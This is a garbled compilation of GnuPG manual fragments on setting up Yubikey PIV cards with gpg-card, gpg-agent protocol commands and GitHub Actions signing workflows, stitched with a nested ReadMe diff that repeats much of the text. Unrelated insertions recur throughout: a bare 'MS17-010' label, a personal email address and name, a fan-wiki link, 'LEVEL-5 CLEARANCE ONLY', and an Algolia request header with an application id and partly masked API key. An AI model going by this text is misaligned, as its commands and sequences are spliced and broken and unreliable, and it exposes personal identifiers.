LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.

GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV Application PIN This is the string 123456.

PIN Unblocking Key This is the string 12345678. list (the string gpg/card> card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...] on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - uses: cli/gh-extension-precompile@v1 with: go_version: "1.16" Then

uses: cli/gh-extension-precompile@v1 env: CGO_ENABLED: 1
uses: cli/gh-extension-precompile@v1 with: build_script_override: "script/build.sh" name: release
on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - id: import_gpg uses: crazy-max/ghaction-import-gpg@v5 with: gpg_private_key: {{ secrets.GPG_PASSPHRASE }} - uses: cli/gh-extension-precompile@v1 with: gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}

macOS

gpg --armor --export-secret-key joe@foo.bar | pbcopy

Ubuntu (assuming GNU base64)

gpg --armor --export-secret-key joe@foo.bar -w0 | xclip

Arch

gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i

FreeBSD (assuming BSD base64)

gpg --armor --export-secret-key joe@foo.bar | xclip

name: import-gpg

on: push: branches: master

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} - name: List keys run: gpg -K name: import-gpg

on: push: branches: master

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8" - name: List keys run: gpg -K

pub ed25519 2021-09-24 [C] 87F257B89CE462100BEC0FFE6071D218380FDCC8 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092 uid [ unknown] Joe Bar joe@bar.foo sub ed25519 2021-09-24 [S] C17D11ADF199F12A30A0910F1F80449BE0B08CB8 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB name: import-gpg /.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add

application-priority piv to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.

With one of these methods employed the list command of gpg-card shows this:

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB.key list --cards well. The PIV authentication key (internal reference PIV.9A Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption

gpg/card> auth 010203040506070801020304050607080102030405060708 gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected ‘--force’ gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpg self-signed X.509 certificate (exit the gpg-card tool, first):

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1 gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

gpgsm --with-keygrip -k 6309304695z@gmail.com Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: 6309304695z@gmail.com

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

6309304695z@gmail.com
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

‘gpgsm --learn’ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt

MS17-010

000006

Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - [verified] - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE722

diff --git a/ReadMe.md b/ReadMe.md index 9f10a05..2888fcd 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -1,3 +1,1210 @@ +diff --git a/ReadMe.md b/ReadMe.md +index 7278f80..41b298d 100644 +--- a/ReadMe.md ++++ b/ReadMe.md +@@ -709,7 +709,844 @@ Digital signature’ key

gpg-card:
gpg/card> writecert PIV.9C < sign.crt ++# MS17-010 ++# 000006 ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - [verified] - ++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E ++ keyref .....: PIV.9A (auth) ++ algorithm ..: nistp384 ++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C ++ keyref .....: PIV.9E (auth) ++ algorithm ..: nistp256 ++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED ++ keyref .....: PIV.9C (sign,cert) ++ algorithm ..: rsa2048 ++ used for ...: X.509 ++ user id ..: CN=Signing key for yk-9074625,O=example,C=DE ++ user id ..: <6309304695z@gmail.co ++ m> ++Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++ keyref .....: PIV.9D (encr) ++ algorithm ..: rsa2048 ++ used for ...: X.509 ++ user id ..: CN=Encryption key for yk-9074625,O=example,C=DE ++ user id ..: 6309304695z@gmail.com ++ PIV authentication’ key with ssh: ++ ++$ ssh-add -l ++384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) ++ssh-add with the uppercase ‘-L ++$ gpgsm --learn ++$ gpg --full-gen-key ++Please select what kind of key you want: ++ (1) RSA and RSA (default) ++ (2) DSA and Elgamal ++ (3) DSA (sign only) ++ (4) RSA (sign only) ++ (14) Existing key from card ++Your selection? 14 ++Serial number of the card: FF020001008A77C1 ++Available keys: ++ (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) ++ (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) ++ (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) ++ (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) ++Your selection? 3 ++Please specify how long the key should be valid. ++ 0 = key does not expire ++ = key expires in n days ++ w = key expires in n weeks ++ m = key expires in n months ++ y = key expires in n years ++Key is valid for? (0) ++Key does not expire at all ++Is this correct? (y/N) y ++ ++GnuPG needs to construct a user ID to identify your key. ++ ++Real name: keith bieszczat ++Email address: 6309304695z@gmail.com ++Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator ++You selected this USER-ID: ++ "6309304695z@gmail.com" ++ ++Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o ++gpg: key C3AFA9ED971BB365 marked as ultimately trusted ++gpg: revocation certificate stored as '[...]D971BB365.rev' ++public and secret key created and signed. ++ ++Note that this key cannot be used for encryption. You may want to use ++the command "--edit-key" to generate a subkey for this purpose. ++pub rsa2048 2019-04-04 [SC] ++ 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 ++uid 6309304695z@gmail.com ++ ++ run gpg in --expert mode ++ $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 ++Secret key is available. ++ ++sec rsa2048/C3AFA9ED971BB365 ++ created: 2019-04-04 expires: never usage: SC ++ card-no: FF020001008A77C1 ++ trust: ultimate validity: ultimate ++[ultimate] (1). otto@example.net ++gpg> addkey ++Secret parts of primary key are stored on-card. ++Please select what kind of key you want: ++ (3) DSA (sign only) ++ (4) RSA (sign only) ++ (5) Elgamal (encrypt only) ++ (6) RSA (encrypt only) ++ (14) Existing key from card ++Your selection? 14 ++Serial number of the card: FF020001008A77C1 ++Available keys: ++ (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) ++ (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) ++ (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) ++ (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) ++Your selection? 4 ++Please specify how long the key should be valid. ++ 0 = key does not expire ++ = key expires in n days ++ w = key expires in n weeks ++ m = key expires in n months ++ y = key expires in n years ++Key is valid for? (0) ++Key does not expire at all ++Is this correct? (y/N) y ++Really create? (y/N) y ++ ++sec rsa2048/C3AFA9ED971BB365 ++ created: 2019-04-04 expires: never usage: SC ++ card-no: FF020001008A77C1 ++ trust: ultimate validity: ultimate ++ssb rsa2048/7067860A98FCE6E1 ++ created: 2019-04-04 expires: never usage: E ++ card-no: FF020001008A77C1 ++[ultimate] (1). otto@example.net ++ ++gpg> save ++ ++/* 32A19-D90712
++LEVEL-5 CLEARANCE ONLY ++ ‘--force’ ++authentication key ++-header-'010203040506070801020304050607080102030405060708' ++SETDATA hexstring ++to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command ++ ++ PKSIGN keyid ++where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like: ++ ++ PKSIGN --hash=algoname keyid ++READKEY hexified_certid ++READCERT hexified_certid|keyid ++SERIALNO ++Return the serial number of the card using a status response like: ++ ++ S SERIALNO D27600000000000000000000 ++ WRITEKEY [--force] keyid ++SETDATA hexstring ++to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command ++ ++ PKDECRYPT keyid ++CHECKPIN idstr ++RESTART ++APDU [--atr] [--more] [--exlen[=n]] [hexstring] ++S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1 ++ ++./configure --sysconfdir=/etc --localstatedir=/va ++CN=Wurzel ZS 3,O=Intevation GmbH,C=DE ++ A6935DD34EF3087973C706FC311AA2CCF733765B S ++ ++ # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE ++ DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S ++ ++ # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE ++ !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S ++
++ # Key added on: 2011-07-20 20:38:46 ++ # Fingerprint: 5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81 ++ 34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm ++private-keys-v1.d/ ++gpg-connect-agent 'help COMMAND' /bye ++SETKEY ++Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available. ++ ++ PKDECRYPT ++The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text. ++ ++ S: INQUIRE CIPHERTEXT ++ C: D (xxxxxx ++ C: D xxxx) ++ C: END ++Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure: ++ ++ (enc-val ++ ( ++ (<param_name1> ) ++ ... ++ (<param_namen> ))) ++Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. ++ ++If the decryption was successful the decrypted data is returned by means of "D" lines. ++ ++Here is an example session: ++ ++ C: PKDECRYPT ++ S: INQUIRE CIPHERTEXT ++ C: D (enc-val elg (a 349324324) ++ C: D (b 3F444677CA))) ++ C: END ++ S: # session key follows ++ S: S PADDING 0 ++ S: D (value 1234567890ABCDEF0) ++ S: OK decryption successful ++The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has ++SIGKEY ++This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay. ++ ++ SETHASH --hash=| ++sig-val ++ ( ++ (<param_name1> ) ++ ... ++ (<param_namen> ))) ++The operation is affected by the option ++ ++ OPTION use-cache-for-signing=0|1 ++The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching. ++ ++Here is an example session: ++ ++ C: SIGKEY ++ S: OK key available ++ C: SIGKEY ++ S: OK key available ++ C: PKSIGN ++ S: # I did ask the user whether he really wants to sign ++ S: # I did ask the user for the passphrase ++ S: INQUIRE HASHVAL ++ C: D ABCDEF012345678901234 ++ C: END ++ S: # signature follows ++ S: D (sig-val rsa (s 45435453654612121212)) ++ S: OK ++ GENKEY [--no-protection] [--preset] [<cache_nonce>] ++Invokes the key generation process and the server will then inquire on the generation parameters, like: ++ ++ S: INQUIRE KEYPARM ++ C: D (genkey (rsa (nbits 1024))) ++ C: END ++The format of the key parameters which depends on the algorithm is of the form: ++ ++ (genkey ++ (algo ++ (parameter_name_1 ....) ++ .... ++ (parameter_name_n ....))) ++If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: ++ ++ (public-key ++ (rsa ++ (n ) ++ (e ))) ++Here is an example session: ++ ++ C: GENKEY ++ S: INQUIRE KEYPARM ++ C: D (genkey (rsa (nbits 1024))) ++ C: END ++ S: D (public-key ++ S: D (rsa (n 326487324683264) (e 10001))) ++ S OK key created ++ ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> ++LISTTRUSTED ++GpgAgent returns a list of trusted keys line by line: ++ ++ S: D 000000001234454556565656677878AF2F1ECCFF P ++ S: D 340387563485634856435645634856438576457A P ++ S: D FEDC6532453745367FD83474357495743757435D S ++ S: OK ++The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. ++Ok ++Finally a client should be able to mark a key as trusted: ++ ++ MARKTRUSTED fingerprint "P"|"S" ++The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this: ++ ++ S: INQUIRE TRUSTDESC ++ C: D Do you trust the key with the fingerprint @FPR@ ++ C: D bla fasel blurb. ++ C: END ++ S: OK ++GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
++ [--qualitybar] cache_id
++ [error_message prompt description] ++PRESET_PASSPHRASE [--inquire] <string_or_keygrip> [] ++ ++HAVEKEY keygrips ++ GET_CONFIRMATION description ++ LEARN [--send] ++UPDATESTARTUPTTY ++SETDATA hexstring ++ ++ ++ PKSIGN keyid ++ ++ ++ PKSIGN --hash=algoname keyid ++ ++READCERT hexified_certid|keyid ++READKEY hexified_certid ++SETDATA hexstring ++d ++ ++ PKSIGN keyid ++ LEARN ++ ++ PKSIGN --hash=algoname keyid ++ ++WRITEKEY [--force] keyid ++WRITEKEY [--force] keyid ++PASSWD [--reset] [--nullpin] chvno ++CHECKPIN idstr ++APDU [--atr] [--more] [--exlen[=n]] [hexstring] ++this: ++ ++ S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1 ++--auto-key-import ++ ++command --locate-external-key ++command --locate-external-key ++github/workflows/release.yml: ++ldap://keys.(thedomain) ++‘--auto-key-locate ++ --auto-key-locate ++--auto-key-retrieve ++ ++ ++ honor-keyserver-url ++ ++-sig-keyserver-url ++--recv-key ++honor-keyserver-url ++--use-agent ++--gpg-agent-info ++ ++ ++--no-random-seed-file ++Host: c7-use-3.algolianet. com ++Accept: / ++Sec-Fetch-Site: cross-site ++Accept-Language: en-US, en; q=0.9 ++Accept-Encoding: gzip, deflate, br ++Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B ++Origin: https://dashboard.algolia.com ++User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe ++x-algolia-api-key: b3cf***********************米** ++Content-Length: 27 ++Connection: keep-alive ++Content-Type: application/x-www-form-urlencoded ++Sec-Fetch-Dest: empty ++ ++scdaemon.conf ++1 ++HKCU\Software\GNU\GnuPG:DefaultLogFile, ++--debug-level level ++HKCU\Software\GNU\GnuPG:DefaultLogFile, ++scd-event ++HKCU\Software\GNU\GnuPG:HomeDir ++HKCU\Software\GNU\GnuPG:DefaultLogFile, ++reader_n.status ++HKCU\Software\GNU\GnuPG:HomeDir ++ ++trustlist.txt file ++gpg-agent.conf ++HKCU\Software\GNU\GnuPG:HomeDir ++name: release ++debug-pinentry ++--debug 1024 ++ ++global trustlist (/usr/local/etc/gnupg/trustlist.tx ++ ++Active cards ++Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. ++gpg-connect-agent updatestartuptty /bye ++Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: ++ ++gpg-connect-agent /bye ++--scdaemon-program filename ++Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf ++--check-passphrase-pattern file ++--check-sym-passphrase-pattern file ++Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) ++bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe ++Keys listed in the sshcontrol file ++--disable-extended-key-format ++These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. ++ ++--enable-ssh-support ++--enable-win32-openssh-support ++--enable-putty-support ++ ++gpg-connect-agent 'GETINFO s2k_count' /bye ++gpg-connect-agent 'GETINFO s2k_time' /bye ++To view the auto-calibrated count use: ++ ++gpg-connect-agent 'GETINFO s2k_count_cal' /bye ++--ssh-fingerprint-digest ++Keys listed in the sshcontrol file ++ ++Active card ++gpg-connect-agent /bye ++bashrc or whatever initialization file is used for all shell invocations: ++ ++GPG_TTY=$(tty) ++export GPG_TTY ++--daemon [command line] ++server ++ ++agent-program file ¶ ++Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. ++ ++--gpg-program file ++Specify a non-default gpg binary to be used by certain commands. ++ ++--gpgsm-program file ++Specify a non-default gpgsm binary to be used by certain commands. ++ ++--chuid uid ++Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. ++ ++gpg-card ++AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ ++AUTH ++FETCH ++GENERATE [--force] [--algo=algo{+algo2}] keyref ++KDF-SETUP ¶ ++Prepare the OpenPGP card KDF feature for this card. ++ ++LANG [--clear] ++Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. ++ ++LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ++NAME [--clear] ++PRIVATEDO [--clear] n [< file] file ++READCERT [--openpgp] certref > file ¶ ++Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". ++URL [--clear] ++gpg's. --fetch ++WRITECERT certref < file ¶ ++WRITECERT --openpgp certref [< file|fpr] ++WRITECERT --clear certref ++ --openpgp ++file ++fpr. ++WRITEKEY [--force] keyref keygrip ¶ ++Write a private key object identified by keygrip to the card under the id keyref. ++CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ ++Serial number ++A hex-string with the serial number of the card. ++ ++Type ++This gives the type of the card’s application. For example "OpenPGP" or "PIV". ++ ++Keygrip ++A hex-string identifying a key. ++ ++Keyref ++The application slot where the key is stored on the card. For example "OpenPGP.1" ++ ++Status ++The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. ++ ++YUBIKEY cmd args ++Various commands pertaining to Yubikey tokens with cmd being: ++ ++LIST ++List supported and enabled Yubikey applications. ++ ++ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] ++DISABLE ++Enable or disable the specified or all applications on the given interface. ++ ++The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. ++ ++GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: ++ ++Authentication key ++This is a 24 byte key described by the hex string ++010203040506070801020304050607080102030405060708. ++ ++PIV Application PIN ++This is the string 123456. ++ ++PIN Unblocking Key ++This is the string 12345678. ++list (the string gpg/card> ++card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: D2760001240102010006090746250000 ++Application type .: OpenPGP ++Version ..........: 2.1 ++[...] ++on: ++ push: ++ tags: ++ - "v" ++ ++permissions: ++ contents: write ++ ++jobs: ++ release: ++ runs-on: ubuntu-latest ++ steps: ++ - uses: actions/checkout@v3 ++ - uses: cli/gh-extension-precompile@v1 ++ with: ++ go_version: "1.16" ++Then ++- uses: cli/gh-extension-precompile@v1 ++ env: ++ CGO_ENABLED: 1 ++- uses: cli/gh-extension-precompile@v1 ++ with: ++ build_script_override: "script/build.sh" ++name: release ++ ++on: ++ push: ++ tags: ++ - "v" ++ ++permissions: ++ contents: write ++ ++jobs: ++ release: ++ runs-on: ubuntu-latest ++ steps: ++ - uses: actions/checkout@v3 ++ - id: import_gpg ++ uses: crazy-max/ghaction-import-gpg@v5 ++ with: ++ gpg_private_key: {{ secrets.GPG_PASSPHRASE }} ++ - uses: cli/gh-extension-precompile@v1 ++ with: ++ gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }} ++# macOS ++gpg --armor --export-secret-key joe@foo.bar | pbcopy ++ ++# Ubuntu (assuming GNU base64) ++gpg --armor --export-secret-key joe@foo.bar -w0 | xclip ++ ++# Arch ++gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i ++ ++# FreeBSD (assuming BSD base64) ++gpg --armor --export-secret-key joe@foo.bar | xclip ++ ++name: import-gpg ++ ++on: ++ push: ++ branches: master ++ ++jobs: ++ import-gpg: ++ runs-on: ubuntu-latest ++ steps: ++ - ++ name: Checkout ++ uses: actions/checkout@v4 ++ - ++ name: Import GPG key ++ uses: crazy-max/ghaction-import-gpg@v6 ++ with: ++ gpg_private_key: {{ secrets.PASSPHRASE }} ++ - ++ name: List keys ++ run: gpg -K ++name: import-gpg ++ ++on: ++ push: ++ branches: master
